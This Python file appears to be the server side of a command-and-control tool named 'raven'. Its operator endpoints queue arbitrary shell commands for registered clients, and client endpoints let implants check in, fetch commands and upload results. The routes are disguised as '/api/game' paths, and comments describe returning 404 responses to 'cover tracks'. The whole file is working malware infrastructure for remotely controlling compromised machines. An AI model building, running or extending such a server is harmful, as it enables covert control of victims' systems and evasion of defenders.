from cornice import Service
from ..models import Client, Address, Task, Status
from secrets import token_hex
from pyramid.httpexceptions import HTTPNoContent, HTTPBadRequest, HTTPNotFound
from datetime import datetime

# Operator Endpoints
raven_operator_list_clients = Service(name='ravenoplistclients',
                                      path='/api/game/commander',
                                      description='List all clients')

raven_operator_cuid = Service(name='ravenopuid',
                              path='/api/game/commander/{cuid}',
                              description='Operator tasks with a single cuid')

raven_operator_task = Service(name='ravenoptask',
                              path='/api/game/commander/{cuid}/{tuid}',
                              description='Single task in a cuid')


# Client Endpoints
raven_registration = Service(name='ravenreg',
                             path='/api/game/login',
                             description='Setup uid, key')

raven_task_board = Service(name='raventask',
                           path='/api/game',
                           description='Communicate with raven tasks')


@raven_operator_list_clients.get()
def list_clients(request):
    """
    Operator Function: List all clients, no pagination yet
    :param request:
    :return:
    """
    clients = list(request.dbsession.query(Client).all())
    return [t.to_json() for t in clients]

@raven_operator_cuid.get()
def list_tasks(request):
    """
    Operator Function: Gets a list of tasks for a given cuid, no pagination yet
    :param request:
    :return:
    """
    cuid = request.matchdict['cuid']
    client = request.dbsession.query(Client).filter_by(cuid=cuid).one()
    tasks = list(request.dbsession.query(Task).filter_by(client=client))
    return [t.to_json() for t in tasks]


@raven_operator_cuid.post()
def add_task(request):
    """
    Operator Function: Adds a task for a given cuid
    :param request:
    :return:
    """
    if 'cmd' in request.POST.keys():
        cuid = request.matchdict['cuid']
        client = request.dbsession.query(Client).filter_by(cuid=cuid).one()
        status = request.dbsession.query(Status).filter_by(pending=True).one()
        now = datetime.now()
        task = Task(tuid=token_hex(8), command=request.POST['cmd'],
                    created=now, status=status, client=client)
        request.dbsession.add(task)
        return {'tuid': task.tuid}
    raise HTTPBadRequest()


@raven_operator_task.get()
def get_task(request):
    """
    Operator Function: Get task details given cuid and tuid
    :param request:
    :return:
    """
    cuid = request.matchdict['cuid']
    tuid = request.matchdict['tuid']
    client = request.dbsession.query(Client).filter_by(cuid=cuid).one()
    task = request.dbsession.query(Task).filter_by(client=client,
                                                   tuid=tuid).one()
    return {task.to_json()}


@raven_registration.post()
def get_login(request):
    """
    Client Function: Provides a cuid and key to a requesting client.
    :param request:
    :return:
    """
    # Pre-chosen SMTP greeting gets you in TODO probably secure this
    if 'ehlo' in request.POST.keys():
        now = datetime.now()
        client = Client(cuid=token_hex(8), key=token_hex(16),
                        shell_hint=request.POST['ehlo'],
                        first_seen=now, last_seen=now)
        request.dbsession.add(client)
        add_or_update_address(request.dbsession, client,
                              request.environ['REMOTE_ADDR'])
        return {'cuid': client.cuid, 'key': client.key}

    raise HTTPNotFound()  # Return 404 in unexpected cases, cover tracks


@raven_task_board.post()
def get_task(request):
    """
    Client Function: Get task from job board
    :param request:
    :return:
    """
    if 'cuid' in request.POST.keys() and 'key' in request.POST.keys():
        cuid = request.POST['cuid']
        key = request.POST['key']
        sesh = request.dbsession
        now = datetime.now()

        if sesh.query(Client).filter_by(cuid=cuid, key=key).count():
            # Grab client, update last_seen
            client = sesh.query(Client).filter_by(cuid=cuid,
                                                  key=key).one()
            client.last_seen = now

            add_or_update_address(request.dbsession, client,
                                  request.environ['REMOTE_ADDR'])

            # Get pending status
            pending = sesh.query(Status).filter_by(pending=True).one()
            if sesh.query(Task).filter_by(client=client,
                                          status=pending).count():
                # Find the task, update status, send task to client
                task = sesh.query(Task).filter_by(client=client,
                                                  status=pending).one()
                status = sesh.query(Status).filter_by(running=True).one()
                task.status = status
                return {'tuid': task.tuid, 'cmd': task.command}
            return HTTPNoContent()
    raise HTTPNotFound()  # Return 404 in unexpected cases, cover tracks


@raven_task_board.put()
def add_results(request):
    """
    Client Function: Submit task results to job board
    :param request:
    :return:
    """
    if set(['cuid', 'key', 'tuid', 'data']).issubset(request.POST.keys()):
        cuid = request.POST['cuid']
        key = request.POST['key']
        tuid = request.POST['tuid']
        results = request.POST['data']
        sesh = request.dbsession
        now = datetime.now()

        if sesh.query(Client).filter_by(cuid=cuid, key=key).count():
            # Grab client, update last_seen
            client = sesh.query(Client).filter_by(cuid=cuid,
                                                  key=key).one()
            client.last_seen = now

            add_or_update_address(request.dbsession, client,
                                  request.environ['REMOTE_ADDR'])
            
            # Get running status
            running_status = sesh.query(Status).filter_by(running=True).one()
            if sesh.query(Task).filter_by(client=client, tuid=tuid,
                                          status=running_status).count():
                # Find the task, update status, add results and completion time
                task = sesh.query(Task).\
                    filter_by(client=client, tuid=tuid).one()
                status = sesh.query(Status).filter_by(done=True).one()
                task.results = results
                task.status = status
                task.completed = datetime.now()
                return {'success': True}
    raise HTTPNotFound()  # Return 404 in unexpected cases, cover tracks


def add_or_update_address(session, client, address):
    """
    Implements functionalty to add or update address field.
    :param address:
    :param client:
    :param now:
    :return:
    """
    now = datetime.now()

    # See if this address is already associated with us
    if session.query(Address).filter_by(address=address).count():
        address = session.query(Address).filter_by(address=address).one()
        address.last_seen = now
    else:  # Create a new address if it's not already there
        address = Address(address=address, first_seen=now, last_seen=now)
        address.client = client
        session.add(address)
